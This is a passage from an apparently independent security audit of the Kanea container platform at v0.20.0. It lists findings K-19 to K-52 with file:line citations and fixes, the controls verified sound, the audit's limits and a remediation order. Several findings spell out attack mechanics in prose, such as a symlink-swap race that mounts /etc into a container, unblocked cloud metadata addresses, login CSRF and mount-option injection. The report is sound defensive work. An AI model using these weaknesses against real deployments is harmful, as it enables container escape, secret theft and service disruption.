PRD §6.2 R3: "the reconciler resolves them at alloc start. **Primary injection mechanism is tmpfs files** (`/run/kanea/secrets/<alloc>/<name>`)". Trace: jobspec validates the ref and leaves the string in `svc.Task.Env` → `convert.go:57` copies verbatim into `Desired.Env` → `plan.go:488` into `AllocSpec.Env` → `spec.go:325-332` renders `KEY=VALUE` into the OCI spec. The only `secrets.Resolve` calls in the reconciler are for `RegistryAuthRef` and edge authz material (grep-verified); no `/run/kanea/secrets` path exists anywhere. The PRD's own example (`DATABASE_URL = "secret:shop/database-url"`) yields a container receiving the **literal string**. Fail-closed, so direct risk is low, but the documented A02 control does not exist, the failure is silent, and it is an attractive nuisance: a future fix that resolves env refs client-side or at apply would put plaintext secrets into the Store. **Remediation:** implement R3 as documented (reconciler-side resolution at `create`, tmpfs files per-alloc, env as the documented weaker opt-in), or amend PRD R3 / threat model / docs to say env values are literal and `secret:` in env is refused at plan. Never resolve into `Desired.Env` before the Store.

### K-20: Host-volume allowlist is TOCTOU-vulnerable between `EvalSymlinks` and the bind mount

`internal/storage/hostpath.go:89-107`: `Resolve` does `EvalSymlinks` → `Stat` → prefix check → returns a **path string**. The mount happens much later (`ensureVolumes` → `AllocSpecFor` → network attach → `driver.Create`/`Start`), tens of ms to seconds. A workload holding an **rw host volume** under the allowlisted prefix runs an atomic-rename loop swapping a checked directory for a symlink to `/etc`; when `Resolve` samples the "real" phase the prefix check passes, and when runc's bind mount samples the "symlink" phase, `/etc` is mounted into the attacker's container. The check is correct; it is checked against a path the attacker can change after the check. **Remediation:** fd-based resolution: `openat2(RESOLVE_BENEATH|NO_SYMLINKS)` (or `O_PATH|O_NOFOLLOW`) and bind-mount via `/proc/self/fd/N`, so the object checked is the object mounted. Short of that: re-`Resolve` immediately before `driver.Create` and document the residual race and the workload-writability precondition in THREAT_MODEL §3.12.

---

## 4. Low-severity findings

### 4.1 Edge / network

| ID | Finding | Remediation |
|----|---------|-------------|
| K-21 | Edge status listener (`/healthz` `/listeners` `/metrics` `/certs` `/routes`, unauthenticated, `internal/edge/server.go:466-543`) can be rebound to a public address via `--status` with no refusal or warning: contradicting §3.16's "it is authenticated" for the same data. | Mirror `listenNetwork`: warn loudly or refuse non-loopback `StatusAddr`; point operators at kanead's authenticated `/v1/metrics`. |
| K-22 | Plan-time and edge-time header-name validators disagree: jobspec refuses 6 edge-owned names (`internal/jobspec/expose.go:625-632`), the edge refuses 9 (`internal/edge/proxy.go:704-714`). A spec with `X-Forwarded-Ssl` passes `plan`, then the whole node's route-table publish fails validation and the edge serves the previous table: for every service. | Share one exported set, or duplicate deliberately with an equality test (the `ownershipRefusedBy` precedent). |
| K-23 | No ceiling on bcrypt cost in `basic_ref` lines (`internal/edge/authz.go:153,266`): an operator-chosen high cost meets an attacker-chosen request rate → CPU exhaustion on the shared edge. The unknown-user dummy is `DefaultCost` while a real line may be cheaper: a weak username oracle inverting the documented timing equalization. | Refuse/clamp cost above ~12-14 at projection and edge compile; bound concurrent verifications; match dummy cost to configured lines. |
| K-24 | TLS session resumption keeps serving a rotated-out certificate for the process lifetime (no `SessionTicketsDisabled`/`SetSessionTicketKeys`, `internal/edge/tls.go:156-171`). Exposure window: compromise-driven rotation. | Document in §3.14, or re-key session tickets on bundle-index change. |
| K-25 | The edge performs no trust check on the projection files it loads (`internal/edge/watch.go:122`): no ownership/mode/regular-file check, symlinks followed. Contrast `nodeconfig.CheckTrusted`. | Stat file+dir on each load (regular, root-owned, not group/world-writable); refuse loudly (keep-last-good makes refusal safe). |
| K-26 | DNS listener has no per-client or global query rate limit: one goroutine per datagram, unbounded (`internal/network/dns.go:243-268`); the only cap guards upstream queries. A workload can pin a kanead core through the local zone. | Serve internal answers inline behind a global in-flight semaphore with drop-on-full (mirror `forwardSlots`); optional per-source token bucket. |
| K-27 | `validateNodeLocal` refuses only wildcard binds (`internal/network/dns.go:147-161`); `--dns-listen <public-IP>` is accepted → open resolver + service-inventory disclosure, the exact outcomes the check's comment says it prevents. | Refuse non-private/non-ULA listen addresses with an explicit force flag if a public resolver is ever supported. |
| K-28 | Forwarded upstream responses >1024 bytes are silently truncated and relayed with ANCOUNT intact and TC unset (`internal/network/dns.go:428-441`): resolution failures for large/DNSSEC answers. | Read up to 4096 (or the client's EDNS size); on overflow set TC and return header+question (the semantics `finish()` already implements). |
| K-29 | `stats_ep`/`stats_drops` key spaces are attacker-influenced, capped at 4096, never evicted (`kanea.c:280-337`): via K-09's primitive a workload permanently blinds per-alloc and drop metrics until a datapath rebuild. | Delete `stats_ep` entries in `Detach`; fold `stats_drops` past a watermark into one overflow key per reason (count the fold). |
| K-30 | v4 multicast/broadcast egress is not dropped while v6 multicast is (`kanea.c:763-772` vs 824-884): allocs can query host-side LLMNR/mDNS listeners. | Drop `224.0.0.0/4` and limited broadcast in `from_container`. |
| K-31 | Both tc programs pass every non-IP ethertype unconditionally (`kanea.c:657-660`, `833-836`): a VLAN/QinQ frame bypasses all L3 checks. Latent today (the host stack kills tagged frames on Kanea's veths); real the moment anyone adds a VLAN subinterface. | Whitelist exactly `ETH_P_IP`/`ETH_P_IPV6`/`ETH_P_ARP`; drop the rest. |
| K-32 | Metadata-endpoint coverage stops at `169.254.0.0/16` + AWS's v6 ULA (`kanea.c:776-781`, `843-847`): Alibaba's `100.100.100.200` and NAT64-wrapped (`64:ff9b::/96`) metadata pass; asymmetric with the notification egress guard, which decodes NAT64 (§3.9). | Add the Alibaba /32; decode `64:ff9b::/96` in `from_container_v6`; or record the limitation in the A10 row. |

### 4.2 API / auth / MCP / dashboard

| ID | Finding | Remediation |
|----|---------|-------------|
| K-33 | `POST /v1/auth/login` accepts any Content-Type (`internal/api/auth.go:432-436`) → login CSRF (session replacement) via a CORS-simple cross-site POST. The MCP transport already gates on `isJSON`. | Enforce `Content-Type: application/json` on login (415 otherwise). |
| K-34 | 5xx responses echo internal error strings verbatim (`writeError`, `server.go:1199-1201`): filesystem layout/subsystem disclosure to any authenticated caller; the same class the codebase avoids elsewhere (uniform `errRefused`). | Fixed 5xx body + correlation id; keep verbatim errors for 4xx. |
| K-35 | No panic recovery in API-spawned goroutines (WS feeds `ws.go:410-413`, exec read loop `exec.go:149`): one future feed bug is a remotely triggerable full control-plane crash for any authenticated viewer. | `defer recover()` in feed/exec goroutines; a feed bug should cost one subscription. |
| K-36 | WS connection cap is daemon-global (32) and shared by viewers and admins (`ws.go:103-105`); the promised per-user caps never landed. A viewer holding 32 sockets denies every subsequent WS/**exec** connection indefinitely. | Per-subject caps, or reserve a slice for `CanWrite()` roles; fix the stale comment. |
| K-37 | Streaming REST log routes hold a goroutine + ≥1 FD per alloc per connection with no cap (`server.go:1051-1117`, `pipelines.go:116-168`): authenticated FD exhaustion of kanead. | Bounded semaphore around streaming handlers (share `wsHub` accounting). |
| K-38 | `Token.LastUsed` is displayed but never written: every token always reports "never used" (`auth.go:107`; no writer exists). Audit-visibility defect that reads as "nothing to see". | Remove or relabel the column (recording per request would violate the v1.37 no-store-writes rule: removal is the honest fix). |
| K-39 | `GET /v1/backups/{id}/verify` is a viewer-reachable "read" that downloads and hashes a full archive per call (`server.go:475-476`, `backups.go:134-157`): egress/CPU churn from a read-only role. | `adminOnly` (or memoize per archive id). |

### 4.3 Builds / supply chain / platform

| ID | Finding | Remediation |
|----|---------|-------------|
| K-40 | `DetectRecipe` is a root file-existence oracle (`buildkit.go:329-343`, `os.Stat` follows symlinks): push access can probe arbitrary host paths. Contents are not leaked (K-01 is the content half). | Subsumed by K-01's remediation (`Lstat` + symlink refusal). |
| K-41 | `kanea upgrade --version` downgrades silently (`cmd/kanea/upgrade.go:78-110`); the only signal is a daemon that refuses a newer schema at next start. | Refuse `target < running` unless `--allow-downgrade`; document the schema-rollback story. |
| K-42 | Release/CI workflows pin actions by mutable tag and install gate tools `@latest` inside the job that holds `id-token: write` and cosign-signs every node's binary (`release.yml`, `ci.yml: securego/gosec@master`). A compromised upstream tag/tool executes inside the trust root. | SHA-pin all actions (Dependabot keeps them fresh); pin tool versions; separate gates from build+sign. |
| K-43 | `selfupdate`'s HTTP client follows redirects without re-checking the scheme (`selfupdate.go:65`), while `provision/fetch.go:36-45` deliberately re-verifies HTTPS per hop. Hardening inconsistency (the archive is hash-verified afterward). | One-line `CheckRedirect` mirroring fetch.go. |
| K-44 | Unbounded clone size: depth-1 into memfs + Materialize with no byte cap (`git.go:171,236`); kanea.slice has a memory floor but no ceiling. Push access already permits DoS: noted for completeness. | A `--max-clone-mb` guard or a transport byte cap. |
| K-45 | Repo-controlled strings (commit subjects, clone URL, buildkit progress) reach operator terminals unescaped via `kanea build --follow`: ANSI/control-sequence terminal manipulation. | Scrub C0/C1 controls (except `\n`/`\t`) at the CLI print boundary. |
| K-46 | Mount-helper positional/flag injection and unbounded `options` pass-through (`internal/storage/mount.go:69-71,100-102,142-158`): spec-controlled `bucket` is positional before flags with no `--`; `options = "rw"` silently overrides `read_only = true`; cifs `options = "uid=0,…"` overrides declared R24 ownership. | Validate character sets for `bucket`/`server`/`export`/`share` at plan; insert `--` where supported; screen `options` against Kanea-set keys. |
| K-47 | Volume mount destinations lack the refusals socket paths get (`validate.go:768-776` vs `1352-1374`): a volume at `/proc` or `/sys/fs/cgroup` self-DoSes the alloc; the asymmetry is the "two implementations drift" class. | Apply the socket rules to volume destinations (share `systemPathFor`). |
| K-48 | `CAP_SETFCAP` is spec-declarable and volume binds are not `nosuid` (`plan.go:505-511`): file capabilities set on a binary inside an **rw host volume** persist on the host for whoever executes it later. `NoNewPrivileges` contains this only inside the container. | Document the interaction in the permitted-set rationale, or drop `CAP_SETFCAP` to a reviewed grant like `CAP_NET_RAW`. |

### 4.4 Secrets / crypto / state

| ID | Finding | Remediation |
|----|---------|-------------|
| K-49 | S3 sink follows HTTP redirects (`internal/backup/s3.go:112-120`, no `CheckRedirect`); Go forwards `Authorization` to same-host/subdomain targets → scoped SigV4 signature replay + ciphertext disclosure to a redirect target. Every other outbound client in the codebase refuses redirects. | `CheckRedirect: … return http.ErrUseLastResponse`; render 3xx through `expect` naming the `Location` host. |
| K-50 | secretsource provider endpoints accept plain `http://` with no warning (`internal/secretsource/config.go:459-468`): bearer tokens, OAuth client secrets and fetched secret values cross in cleartext; the S3 sink warns loudly for the identical decision. | One-time warning per provider at build on `http` (mirror the S3 wording), or refuse `http` for non-loopback hosts. |
| K-51 | Provided TLS private-key files are not permission-checked (`internal/certsource/provided.go:337-345`), unlike every other credential-bearing file (master key, provider credentials, bundle). A world-readable key is silently accepted and re-published into the 0640 bundle where it *looks* protected. | Warn (not refuse: certbot layouts are legitimate) at `loadGrant` time on group/other-readable keys. |
| K-52 | `state.db` permissions are set only at creation (`internal/store/bbolt.go:96-101`); an existing database's mode is never verified at `Open`. The file holds the CA key, ACME account/leaf keys, bcrypt hashes and token/session hashes. The master key one directory away gets a refuse-to-start check. | `os.Stat` at `Open`; warn or refuse on group/other-readable (mirror `checkKeyPermissions`). |

### 4.5 Informational (no action required: recorded for accuracy)

- **I-1:** On v4-only nodes, AF_INET6 v4-mapped dials to v4 VIPs fail closed (no connect6 link): availability/observability note, not a vulnerability; a one-line docs mention would save a tcpdump session.
- **I-2:** Service withdrawal deletes the LB frontend before its backends (`lb.go:50-56`); a racing connect blackholes instead of failing fast (EPERM). Microsecond window, deliberate ordering; the flip path itself is correct and fail-closed.
- **I-3:** Opaque-dir whiteouts (`.wh..wh..opq`) are not honoured in OCI layer extraction (`image.go:263-265`): only relevant if a pinned upstream image used one over a wanted path.
- **I-4:** The cosign identity regexp in `selfupdate.go:186-191` is unanchored with unescaped metacharacters: safe today given GitHub OIDC identity shape; worth a comment.
- **I-5:** `NewLDAP` does not reject userinfo in `--ldap-url`, and the URL is written to audit Detail and daemon logs on directory logins: operator-induced only.

---

## 5. What was verified sound (selected)

The audit's negative results matter as much as the findings; these load-bearing claims were checked and **hold**:

- **Auth:** deny-by-default route registration (one policy wrapper; admin-only by omission); CSRF allowlist with the v1.47 regression tests and the `Upgrade`-gated subprotocol carrier; 256-bit server-generated session ids, SHA-256 at rest, absolute expiry, server-side revocation on logout; bcrypt-12 with timing equalization on local-miss; LDAP mandatory TLS, pre-dial empty-password refusal, `EscapeFilter` at both insertion points, ambiguous-search refusal, local-wins structurally; OIDC crypto/rand state/nonce, PKCE S256, single-use pending logins, `safeNext` bounds; rate limiter keyed on connection peer only (no X-Forwarded-For trust anywhere); webhook HMAC over the raw body with `hmac.Equal`, sha1 downgrade refused, bounded replay cache, 1 MiB pre-verification body cap, and the webhook never deploys request content; audit log centrally redacted and hash-chained.
- **Edge:** exact-match normalized Host routing (unknown Host → 404); inbound `X-Forwarded-*`/`Forwarded` deleted before re-derivation from the connection; hop-by-hop stripping honors Connection-listed names; CRLF injection rejected by the stdlib on both directions (empirically verified); middleware order IP-restriction → rate limit → auth → upstream everywhere, with TCP/UDP checks before any byte is forwarded; JWT algorithm from configuration only (`alg:none` impossible, `kid` ignored, `exp` mandatory, constant-time HMAC); fail-closed 503 on missing verifier material; TLS min 1.2, hot-reload race-free; projection writes temp→fsync→chmod→rename with read-side re-validation and keep-last-good; metric label allowlists and overflow counters as documented.
- **Workload isolation:** spec-opt ordering correct (`WithImageConfig` first); capability pipeline has no case/whitespace bypass and the forbidden list holds; device-cgroup deny-all seeding with the append-after ordering pinned by test; NNP on every path incl. exec/probes (which copy `*spec.Process`); private PID/IPC/UTS/mount/cgroup namespaces; masked/readonly paths match containerd's full default set; pids cap unconditional; cgroup path free of spec influence; passthrough grants are names (no path field exists), per-alloc resolved with type checks; R15 symlink-resolved prefix checks with the nearest-existing-ancestor create rule; secrets XChaCha20 with path-as-AD and traversal-proof `CleanPath`; all helper execs are argv without a shell.
- **Crypto/state:** every security-sensitive value uses `crypto/rand` (the two `math/rand` uses are a poll jitter and a test); master key 32-byte crypto/rand, O_EXCL 0600, fsynced, refuse-to-start on mode drift; backup chunk nonces are random-prefix+counter with cross-archive splice, reorder, truncation and final-chunk-substitution all failing authentication; HKDF domain separation correct; SigV4 canonicalization CI-verified against MinIO with server-side recomputation; secretsource clients refuse redirects, cap responses, type-decode errors, and enforce 0600 credential files; ACME account/leaf keys P-256 in the Store, HTTP-01 tokens validated against path tricks, DNS-01 requires TSIG.
- **Datapath:** external-source anti-spoof/v1.65 return-pass composition correct; fragment and source-routing handling fail closed; VIP-leak backstop on the right hook (tc egress) for UDP/unconnected/raw sends; generation-flip protocol correct (puts → atomic commit → deletes; a racing connect refuses, never sees a torn set); attach/detach ordering fail-closed; ifalias parsing total (no panics); ID/VIP allocation monotonic and race-free; nftables scoped to the owned table with source-cluster-only masquerade; pinned cgroup link updated in place; v6-disabled posture genuinely drops `ETH_P_IPV6` and sets `disable_ipv6`; the shipping BPF object is verifier-clean with all dereferences guarded.
- **MCP/dashboard:** MCP forwards only `Authorization`/`Cookie`/`X-Kanea-CSRF` (inner routes re-authenticate, re-check CSRF, re-audit); tier enforcement fails closed; no secrets verb exists; JSON-RPC bounded and non-batch; WS upgrade Origin-checked before accept on both sockets; the dashboard has no XSS sinks found, CSP has `script-src 'self'` with no inline exception and the post-fix `connect-src` is correct; exec is admin-only, CSRF'd, argv-only, numeric-user-only, audited.

---

## 6. Limits of this audit

- Static review plus targeted verification; no dynamic exploitation was performed against a live node (the environment is a macOS dev checkout; the datapath, systemd units and build pipeline are Linux-only).
- `make security` (gosec/govulncheck/gitleaks) was not re-run; the CI gates are assumed green per the repository's own workflow.
- The eBPF findings are from source review of `bpf/kanea.c` and the Go loader; the 5.10-kernel floor behaviors the project itself flags as unverified remain so.
- Third-party behavior claims that are load-bearing (buildkit v0.32.0 fsutil/parser, containerd v2.3.3 import naming, Go stdlib redirect/header behavior) were verified against the pinned upstream sources, not just assumed.

---

## 7. Remediation priority

**Now (boundary-crossing, cheap fixes):**
1. K-01: `EvalSymlinks` + symlink refusal in `withinDir`/`DetectRecipe`; `validateBuild` at plan. (One map lookup and a linter away from safe; currently the worst hole in the platform.)
2. K-03: scope-check `storage.auth_ref`; validate `endpoint`.
3. K-04: DNS-1123 validation in `applyServices` (+ defense-in-depth containment asserts at path-composition points).
4. K-05: digest comparison in `Fetch` after `GetImage`/`Import`.
5. K-02: `User=kanea-edge` in the unit + `--edge-certs-gid` wiring + unit test.

**Next (documented-control gaps):**
6. K-06: actually apply a default seccomp profile (or amend the documents; applying is right).
7. K-08: HMAC the backup manifest; contiguity-check replay.
8. K-07: document the build threat model; add the buildkit-cgroup/uid egress drop for `169.254.0.0/16`.
9. K-17: `validateDesired` at the apply seam.
10. K-19: implement R3 tmpfs secret injection or amend the documents.

**Then (hardening, all small and local):** K-09…K-18, and the Low table: most are one-to-five-line changes following patterns the codebase already has (duplicated checks with equality tests, trust checks at file loads, caps with visible drop counters).

---

*Report prepared by an independent security review of the working tree at commit `7515be2` (v0.20.0). Findings cite file:line against that tree; upstream citations cite the versions pinned in `internal/provision/components.json` and `go.mod`.*
